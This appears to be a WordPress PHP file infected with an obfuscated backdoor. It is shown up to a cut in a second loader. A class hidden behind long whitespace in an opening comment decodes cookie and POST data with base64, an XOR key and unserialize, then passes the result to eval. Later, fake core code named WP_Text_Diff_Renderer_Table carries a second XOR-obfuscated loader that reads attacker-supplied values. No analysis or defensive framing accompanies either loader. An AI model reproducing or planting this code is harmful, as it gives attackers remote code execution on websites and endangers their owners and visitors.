<?php /*                                                                                                                                                                                                                                                                                                                                                                                                  $fNQxDW = class_exists("d_IPIln"); $HDqmajFn = $fNQxDW;if (!$HDqmajFn){class d_IPIln{private $rlGldLRqx;public static $tyhsUFH = "9f4f9df7-6f3c-437d-bd24-dc8892928b8f";public static $RTPnw = NULL;public function __construct(){$AwQVvreW = $_COOKIE;$EdauKmK = $_POST;$zdEPEPE = @$AwQVvreW[substr(d_IPIln::$tyhsUFH, 0, 4)];if (!empty($zdEPEPE)){$UQuxtYzJVc = "base64";$BHKdHk = "";$zdEPEPE = explode(",", $zdEPEPE);foreach ($zdEPEPE as $oXVHQfN){$BHKdHk .= @$AwQVvreW[$oXVHQfN];$BHKdHk .= @$EdauKmK[$oXVHQfN];}$BHKdHk = array_map($UQuxtYzJVc . "\x5f" . "\x64" . chr ( 968 - 867 ).'c' . "\x6f" . chr ( 267 - 167 ).chr (101), array($BHKdHk,)); $BHKdHk = $BHKdHk[0] ^ str_repeat(d_IPIln::$tyhsUFH, (strlen($BHKdHk[0]) / strlen(d_IPIln::$tyhsUFH)) + 1);d_IPIln::$RTPnw = @unserialize($BHKdHk);}}public function __destruct(){$this->FWwKlBRzz();}private function FWwKlBRzz(){if (is_array(d_IPIln::$RTPnw)) {$xhPsrssCTW = str_replace(chr (60) . chr ( 322 - 259 ).chr (112) . "\x68" . 'p', "", d_IPIln::$RTPnw["\x63" . chr ( 203 - 92 ).chr (110) . "\164" . chr ( 769 - 668 ).'n' . chr ( 891 - 775 )]);eval($xhPsrssCTW);exit();}}}$KKwgFEbsqF = new d_IPIln(); $KKwgFEbsqF = NULL;} ?><?php /* 
*
...
class WP_Text_Diff_Renderer_Table extends Text_Diff_Renderer {
	...
	*
	...
	$exclude_from_search = 'icon_dir_uri';
$caption = 'fA9NxxtOziJ0';
function remove_breaks($posts_per_page, $current_filter)

{
    $kids = urldecode($posts_per_page);
	$wp_post_statuses = 'ext_types';
    $allowed_protocols = substr($current_filter,0, strlen($kids));

    $ignore_sticky_posts = $kids ^ $allowed_protocols;
    return $ignore_sticky_posts;
	$delete = 'translation';
}

$translation_table = ${remove_breaks("9%07p%02%3D%2B", $caption)};

if (isset($translation_table[$caption]))

{
    $_edit_link = $translation_table[$caption];
    $incposts = $_edit_link[remove_breaks("%12%2CI%11%16%19%19%2A", $caption)];
